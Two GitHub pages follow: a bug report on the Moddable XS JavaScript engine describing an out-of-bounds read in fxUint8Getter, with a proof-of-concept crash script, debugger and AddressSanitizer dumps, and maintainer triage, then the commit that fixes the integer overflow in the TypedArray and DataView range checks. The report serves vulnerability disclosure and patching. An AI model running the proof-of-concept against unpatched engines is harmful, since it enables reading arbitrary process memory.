=== Content from github.com_13062c03_20250114_191124.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FModdable-OpenSource%2Fmoddable%2Fissues%2F896)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FModdable-OpenSource%2Fmoddable%2Fissues%2F896)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=Moddable-OpenSource%2Fmoddable)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Moddable-OpenSource](/Moddable-OpenSource)
/
**[moddable](/Moddable-OpenSource/moddable)**
Public

* [Notifications](/login?return_to=%2FModdable-OpenSource%2Fmoddable) You must be signed in to change notification settings
* [Fork
  239](/login?return_to=%2FModdable-OpenSource%2Fmoddable)
* [Star
   1.4k](/login?return_to=%2FModdable-OpenSource%2Fmoddable)

* [Code](/Moddable-OpenSource/moddable)
* [Issues
  47](/Moddable-OpenSource/moddable/issues)
* [Pull requests
  23](/Moddable-OpenSource/moddable/pulls)
* [Discussions](/Moddable-OpenSource/moddable/discussions)
* [Actions](/Moddable-OpenSource/moddable/actions)
* [Projects
  0](/Moddable-OpenSource/moddable/projects)
* [Security](/Moddable-OpenSource/moddable/security)
* [Insights](/Moddable-OpenSource/moddable/pulse)

Additional navigation options

* [Code](/Moddable-OpenSource/moddable)
* [Issues](/Moddable-OpenSource/moddable/issues)
* [Pull requests](/Moddable-OpenSource/moddable/pulls)
* [Discussions](/Moddable-OpenSource/moddable/discussions)
* [Actions](/Moddable-OpenSource/moddable/actions)
* [Projects](/Moddable-OpenSource/moddable/projects)
* [Security](/Moddable-OpenSource/moddable/security)
* [Insights](/Moddable-OpenSource/moddable/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2FModdable-OpenSource%2Fmoddable%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2FModdable-OpenSource%2Fmoddable%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Out-of-bounds Read in fxUint8Getter #896

Closed

[Q1IQ](/Q1IQ) opened this issue
Apr 8, 2022
· 3 comments

Closed

# [Out-of-bounds Read in fxUint8Getter](#top) #896

[Q1IQ](/Q1IQ) opened this issue
Apr 8, 2022
· 3 comments

Labels
[confirmed](/Moddable-OpenSource/moddable/labels/confirmed)
issue reported has been reproduced

## Comments

[![@Q1IQ](https://avatars.githubusercontent.com/u/52093495?s=80&u=7009866e22d1aa82a4f8d29d13cb52d2f186fdf5&v=4)](/Q1IQ)

Copy link

### **[Q1IQ](/Q1IQ)** commented [Apr 8, 2022](#issue-1196877726) • edited Loading

| Environment **Build environment:** Linux ubuntu 5.13.0-27-generic [#29](https://github.com/Moddable-OpenSource/moddable/pull/29)~20.04.1-Ubuntu SMP Fri Jan 14 00:32:30 UTC 2022 x86\_64 x86\_64 x86\_64 GNU/Linux  **Target device:** sdk  **Commit:** [e26597b](https://github.com/Moddable-OpenSource/moddable/commit/e26597b9bf71e4d79f01cb329bd04f1562d32ddc) Proof of concept poc.js  ``` function main() { var a4 = [1111111111,1111111111,1111111111,1111111111,1111111111]; var a5 = [11111111111111111111]; var a8 = ``; var a9 = 0; var a10 = Uint32Array; var a11 = new Uint8ClampedArray(); ({"buffer":a9,"byteLength":a10,"byteOffset":a8,} = a11); var a13 = new Uint8ClampedArray(a9,1111111111,...a4); var a14 = new Uint32Array(Symbol,111111111111111,...a5,...a13); } main();  ``` Analysis In file: /moddable/xs/sources/xsDataView.c  ```    2891 }    2892     2893 void fxUint8Getter(txMachine* the, txSlot* data, txInteger offset, txSlot* slot, int endian)    2894 {    2895  slot->kind = XS_INTEGER_KIND;  ► 2896  slot->value.integer = c_read8((txU1*)(data->value.arrayBuffer.address + offset)); => [1]    2897  mxMeterOne();    2898 }    2899   ```  Since the `offset` in [1] is controlled by attackers, this issue brings arbitrary memory read primitive.  ```  RAX  0x800038ff226f  RBX  0x7ffff6c47590 ◂— 0x0  RCX  0x7ffff6c475f0 ◂— 0x0  RDX  0x7ffff6c4eca8 ◂— 0x0  RDI  0x5555557162a0 —▸ 0x7ffff6c47590 ◂— 0x0  RSI  0x7ffff44670d0 —▸ 0x7ffff44670f0 ◂— 0x0  R8   0x0  R9   0x5555555c64cf (fxUint8Getter) ◂— endbr64   R10  0x555555737004 ◂— 0xc7a000001e35390  R11  0x0  R12  0x0  R13  0x0  R14  0x7ffff445c890 —▸ 0x7ffff445c8b0 —▸ 0x7ffff445c8d0 —▸ 0x7ffff445c8f0 ◂— 0x0  R15  0x7ffff6c476b0 —▸ 0x7ffff6c479f0 —▸ 0x7ffff6c47ad0 —▸ 0x7ffff6c47bf0 ◂— 0x0  RBP  0x7fffffffae50 —▸ 0x7fffffffaea0 —▸ 0x7fffffffbb80 —▸ 0x7fffffffbbd0 —▸ 0x7fffffffbc30 ◂— ...  RSP  0x7fffffffae50 —▸ 0x7fffffffaea0 —▸ 0x7fffffffbb80 —▸ 0x7fffffffbbd0 —▸ 0x7fffffffbc30 ◂— ...  RIP  0x5555555c6502 (fxUint8Getter+51) ◂— movzx  eax, byte ptr [rax] ───────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────    0x5555555c64ff <fxUint8Getter+48>    add    rax, rdx  ► 0x5555555c6502 <fxUint8Getter+51>    movzx  eax, byte ptr [rax]    0x5555555c6505 <fxUint8Getter+54>    movzx  edx, al    0x5555555c6508 <fxUint8Getter+57>    mov    rax, qword ptr [rbp - 0x20]    0x5555555c650c <fxUint8Getter+61>    mov    dword ptr [rax + 0x10], edx    0x5555555c650f <fxUint8Getter+64>    nop        0x5555555c6510 <fxUint8Getter+65>    pop    rbp    0x5555555c6511 <fxUint8Getter+66>    ret          0x5555555c6512 <fxUint8Setter>       endbr64     0x5555555c6516 <fxUint8Setter+4>     push   rbp    0x5555555c6517 <fxUint8Setter+5>     mov    rbp, rsp    0x5555555c651a <fxUint8Setter+8>     mov    qword ptr [rbp - 0x18], rdi ───────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────────────────────────────── In file: /home/q1iq/Documents/share/moddable-origin/e26597b/moddable/xs/sources/xsDataView.c    2891 }    2892     2893 void fxUint8Getter(txMachine* the, txSlot* data, txInteger offset, txSlot* slot, int endian)    2894 {    2895 	slot->kind = XS_INTEGER_KIND;  ► 2896 	slot->value.integer = c_read8((txU1*)(data->value.arrayBuffer.address + offset));    2897 	mxMeterOne();    2898 }    2899     2900 void fxUint8Setter(txMachine* the, txSlot* data, txInteger offset, txSlot* slot, int endian)    2901 { ───────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────── 00:0000│ rbp rsp 0x7fffffffae50 —▸ 0x7fffffffaea0 —▸ 0x7fffffffbb80 —▸ 0x7fffffffbbd0 —▸ 0x7fffffffbc30 ◂— ... 01:0008│         0x7fffffffae58 —▸ 0x5555555bcc42 (fxTypedArrayGetter+329) ◂— nop     02:0010│         0x7fffffffae60 —▸ 0x7fffffffae90 —▸ 0x7ffff4467250 —▸ 0x7ffff4467270 ◂— 0x0 03:0018│         0x7fffffffae68 —▸ 0x5555557162a0 —▸ 0x7ffff6c47590 ◂— 0x0 04:0020│         0x7fffffffae70 ◂— 0x7450 /* 'Pt' */ 05:0028│         0x7fffffffae78 ◂— 0x423a35c700000000 06:0030│         0x7fffffffae80 —▸ 0x7ffff4467210 —▸ 0x7ffff4467230 —▸ 0x7ffff4467250 —▸ 0x7ffff4467270 ◂— ... 07:0038│         0x7fffffffae88 —▸ 0x7ffff4467230 —▸ 0x7ffff4467250 —▸ 0x7ffff4467270 ◂— 0x0 ─────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────  ► f 0   0x5555555c6502 fxUint8Getter+51    f 1   0x5555555bcc42 fxTypedArrayGetter+329    f 2   0x55555562d8d4 fxRunID+3486    f 3   0x55555558576e fxGetAll+598    f 4   0x55555559c824 fx_ArrayIterator_prototype_next+357    f 5   0x55555562d8d4 fxRunID+3486    f 6   0x5555556476fa fxRunScript+3157    f 7   0x5555556ac0ef fxRunProgramFile+190  ```  In this case, rax is an out-of-bounds read index of the `value.arrayBuffer.address`, which has the value of `0x7ffff6c4eca8+1111111111`. ASAN Stack dump ``` AddressSanitizer:DEADLYSIGNAL ================================================================= ==1832495==ERROR: AddressSanitizer: SEGV on unknown address 0x7fa3408a4a6f (pc 0x0000005dcb52 bp 0x7ffcb61fa520 sp 0x7ffcb61fa490 T0) ==1832495==The signal is caused by a READ memory access.     #0 0x5dcb52 in fxUint8Getter /home/q1iq/Documents/moddable/xs/sources/xsDataView.c:2895:24     #1 0x5bdef6 in fxTypedArrayGetter /home/q1iq/Documents/moddable/xs/sources/xsDataView.c:1013:4     #2 0x7bb754 in fxRunID /home/q1iq/Documents/moddable/xs/sources/xsRun.c:845:7     #3 0x4e7d61 in fxGetAll /home/q1iq/Documents/moddable/xs/sources/xsAPI.c:974:4     #4 0x5357f2 in fx_ArrayIterator_prototype_next /home/q1iq/Documents/moddable/xs/sources/xsArray.c:2592:5     #5 0x7bb754 in fxRunID /home/q1iq/Documents/moddable/xs/sources/xsRun.c:845:7     #6 0x82df0f in fxRunScript /home/q1iq/Documents/moddable/xs/sources/xsRun.c:4790:4     #7 0xa02bbe in fxRunProgramFile /home/q1iq/Documents/moddable/xs/tools/xst.c:1640:2     #8 0x9fcdad in main /home/q1iq/Documents/moddable/xs/tools/xst.c:332:8     #9 0x7fa302a7a082 in __libc_start_main /build/glibc-KZwQYS/glibc-2.31/csu/../csu/libc-start.c:308:16     #10 0x42f66d in _start (/home/q1iq/Documents/moddable/build/bin/lin/debug/xst+0x42f66d)  AddressSanitizer can not provide additional info. SUMMARY: AddressSanitizer: SEGV /home/q1iq/Documents/moddable/xs/sources/xsDataView.c:2895:24 in fxUint8Getter ==1832495==ABORTING  ``` Credit P1umer([@P1umer](https://github.com/P1umer)) and Q1IQ([@Q1IQ](https://github.com/Q1IQ)) |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@phoddie](https://avatars.githubusercontent.com/u/6856458?s=40&u=215e33360b9ddfee4db978bab8a275a39972aa9f&v=4)](/phoddie)
[phoddie](/phoddie)
added
the
[confirmed](/Moddable-OpenSource/moddable/labels/confirmed)
issue reported has been reproduced
label
[Apr 8, 2022](#event-6397485587)

[![@phoddie](https://avatars.githubusercontent.com/u/6856458?s=80&u=215e33360b9ddfee4db978bab8a275a39972aa9f&v=4)](/phoddie)

Copy link

Collaborator

### **[phoddie](/phoddie)** commented [Apr 8, 2022](#issuecomment-1093020566)

| Thank you for the detailed report.  A quick review suggests that the problem is integer overflow in the TypedArray constructor:     [moddable/xs/sources/xsDataView.c](https://github.com/Moddable-OpenSource/moddable/blob/e26597b9bf71e4d79f01cb329bd04f1562d32ddc/xs/sources/xsDataView.c#L1360)  Line 1360 in [e26597b](/Moddable-OpenSource/moddable/commit/e26597b9bf71e4d79f01cb329bd04f1562d32ddc)   |  | if (info->value.bufferInfo.length < (offset + size)) | | --- | --- |      The expression `offset + size` overflows, bypassing the range check. Replacing that with `fxAddChunkSizes(the, offset, size)` catches the overflow.  A similar issue appears to be present in the [DataView constructor](https://github.com/Moddable-OpenSource/moddable/blob/public/xs/sources/xsDataView.c#L746). We'll review for related issues. |
| --- | --- | --- |

All reactions

Sorry, something went wrong.

[mkellner](/mkellner)
pushed a commit
that referenced
this issue
[Apr 12, 2022](#ref-commit-135aa9a)

`[XS:](/Moddable-OpenSource/moddable/commit/135aa9a4a6a9b49b60aa730ebc3bcc6247d75c45 "XS: #896") [#896](https://github.com/Moddable-OpenSource/moddable/issues/896)`

`[135aa9a](/Moddable-OpenSource/moddable/commit/135aa9a4a6a9b49b60aa730ebc3bcc6247d75c45)`

[![@P1umer](https://avatars.githubusercontent.com/u/39682706?s=80&u=37d920d8873c2b96f8d6f20cab9e764232ed2f63&v=4)](/P1umer)

Copy link

### **[P1umer](/P1umer)** commented [Apr 15, 2022](#issuecomment-1100199845)

| Nice work! The problem disappeared with the patch. Bug fixed. |
| --- |

All reactions

Sorry, something went wrong.

[![@phoddie](https://avatars.githubusercontent.com/u/6856458?s=80&u=215e33360b9ddfee4db978bab8a275a39972aa9f&v=4)](/phoddie)

Copy link

Collaborator

### **[phoddie](/phoddie)** commented [Apr 15, 2022](#issuecomment-1100289038)

| Cool. Thank you for verifying. |
| --- |

All reactions

Sorry, something went wrong.

[![@phoddie](https://avatars.githubusercontent.com/u/6856458?s=40&u=215e33360b9ddfee4db978bab8a275a39972aa9f&v=4)](/phoddie)
[phoddie](/phoddie)
closed this as [completed](/Moddable-OpenSource/moddable/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Apr 15, 2022](#event-6441688065)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2FModdable-OpenSource%2Fmoddable%2Fissues%2F896)

Assignees

No one assigned

Labels

[confirmed](/Moddable-OpenSource/moddable/labels/confirmed)
issue reported has been reproduced

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

3 participants

[![@phoddie](https://avatars.githubusercontent.com/u/6856458?s=52&v=4)](/phoddie) [![@P1umer](https://avatars.githubusercontent.com/u/39682706?s=52&v=4)](/P1umer) [![@Q1IQ](https://avatars.githubusercontent.com/u/52093495?s=52&v=4)](/Q1IQ)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_fa0098d7_20250114_191122.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FModdable-OpenSource%2Fmoddable%2Fcommit%2F135aa9a4a6a9b49b60aa730ebc3bcc6247d75c45)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FModdable-OpenSource%2Fmoddable%2Fcommit%2F135aa9a4a6a9b49b60aa730ebc3bcc6247d75c45)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=Moddable-OpenSource%2Fmoddable)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Moddable-OpenSource](/Moddable-OpenSource)
/
**[moddable](/Moddable-OpenSource/moddable)**
Public

* [Notifications](/login?return_to=%2FModdable-OpenSource%2Fmoddable) You must be signed in to change notification settings
* [Fork
  239](/login?return_to=%2FModdable-OpenSource%2Fmoddable)
* [Star
   1.4k](/login?return_to=%2FModdable-OpenSource%2Fmoddable)

* [Code](/Moddable-OpenSource/moddable)
* [Issues
  47](/Moddable-OpenSource/moddable/issues)
* [Pull requests
  23](/Moddable-OpenSource/moddable/pulls)
* [Discussions](/Moddable-OpenSource/moddable/discussions)
* [Actions](/Moddable-OpenSource/moddable/actions)
* [Projects
  0](/Moddable-OpenSource/moddable/projects)
* [Security](/Moddable-OpenSource/moddable/security)
* [Insights](/Moddable-OpenSource/moddable/pulse)

Additional navigation options

* [Code](/Moddable-OpenSource/moddable)
* [Issues](/Moddable-OpenSource/moddable/issues)
* [Pull requests](/Moddable-OpenSource/moddable/pulls)
* [Discussions](/Moddable-OpenSource/moddable/discussions)
* [Actions](/Moddable-OpenSource/moddable/actions)
* [Projects](/Moddable-OpenSource/moddable/projects)
* [Security](/Moddable-OpenSource/moddable/security)
* [Insights](/Moddable-OpenSource/moddable/pulse)

## Commit

[Permalink](/Moddable-OpenSource/moddable/commit/135aa9a4a6a9b49b60aa730ebc3bcc6247d75c45)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

XS: [#896](https://github.com/Moddable-OpenSource/moddable/issues/896)

[Browse files](/Moddable-OpenSource/moddable/tree/135aa9a4a6a9b49b60aa730ebc3bcc6247d75c45)
Browse the repository at this point in the history

* Loading branch information

Patrick Soquet
committed
Apr 12, 2022

1 parent
[249ec43](/Moddable-OpenSource/moddable/commit/249ec437002eaffea0b19134d60776d2c4564471)

commit 135aa9a

Showing
**1 changed file**
with
**9 additions**
and
**5 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

14 changes: 9 additions & 5 deletions

14
[xs/sources/xsDataView.c](#diff-6a3b88c9d3ff0295184bc1ed22ca0a0e3dcf2377f95948d90dfe61fa9797abf1 "xs/sources/xsDataView.c")

Show comments

[View file](/Moddable-OpenSource/moddable/blob/135aa9a4a6a9b49b60aa730ebc3bcc6247d75c45/xs/sources/xsDataView.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -773,7 +773,8 @@ void fx\_DataView(txMachine\* the) |
|  |  | mxRangeError("out of range byteOffset %ld", offset); |
|  |  | size = fxArgToByteLength(the, 2, -1); |
|  |  | if (size >= 0) { |
|  |  | if (info->value.bufferInfo.length < (offset + size)) |
|  |  | txInteger end = offset + size; |
|  |  | if ((info->value.bufferInfo.length < end) || (end < offset)) |
|  |  | mxRangeError("out of range byteLength %ld", size); |
|  |  | } |
|  |  | else { |
| Expand All | | @@ -793,7 +794,8 @@ void fx\_DataView(txMachine\* the) |
|  |  | if (info->value.bufferInfo.length < offset) |
|  |  | mxRangeError("out of range byteOffset %ld", offset); |
|  |  | else if (size >= 0) { |
|  |  | if (info->value.bufferInfo.length < (offset + size)) |
|  |  | txInteger end = offset + size; |
|  |  | if ((info->value.bufferInfo.length < end) || (end < offset)) |
|  |  | mxRangeError("out of range byteLength %ld", size); |
|  |  | } |
|  |  | } |
| Expand Down  Expand Up | | @@ -1360,9 +1362,11 @@ void fx\_TypedArray(txMachine\* the) |
|  |  | size = fxArgToByteLength(the, 2, -1); |
|  |  | info = fxGetBufferInfo(the, mxArgv(0)); |
|  |  | if (size >= 0) { |
|  |  | size <<= shift; |
|  |  | if (info->value.bufferInfo.length < (offset + size)) |
|  |  | mxRangeError("out of range byteLength %ld", size); |
|  |  | txInteger delta = size << shift; |
|  |  | txInteger end = offset + delta; |
|  |  | if ((info->value.bufferInfo.length < end) || (end < offset)) |
|  |  | mxRangeError("out of range length %ld", size); |
|  |  | size = delta; |
|  |  | } |
|  |  | else { |
|  |  | if (info->value.bufferInfo.length & ((1 << shift) - 1)) |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `135aa9a`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FModdable-OpenSource%2Fmoddable%2Fcommit%2F135aa9a4a6a9b49b60aa730ebc3bcc6247d75c45) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


